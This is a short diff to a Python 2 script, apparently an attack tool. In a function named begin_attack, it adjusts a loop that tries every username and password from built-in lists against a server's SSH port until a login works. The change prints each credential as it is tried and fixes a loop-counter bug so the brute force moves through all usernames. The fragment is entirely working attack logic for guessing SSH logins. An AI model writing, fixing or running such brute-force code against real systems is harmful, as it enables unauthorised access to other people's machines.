@@ -126,8 +126,10 @@ def begin_attack(client):
         log_root = False
         while (userN < user_len) and (not logged_in):
             userCred = USERNAMES[userN]
+            print "USER: %s" % userCred
             while (passwd < passwd_len) and (not logged_in):
                 passCred = PASSWORDS[passwd]
+                print "PASSWORD: %s" % passCred
                 try:
                     if initial_comps > 0:
                         initial_comps -= 1
@@ -150,7 +152,7 @@ def begin_attack(client):
                     # print('*** Failed to connect to %s:%d: %r' % (server.host, server.ssh_port, e))
                     passwd += 1
 
-            userCred += 1
+            userN += 1
             passwd = 0
 
         # if we have logged into the machine
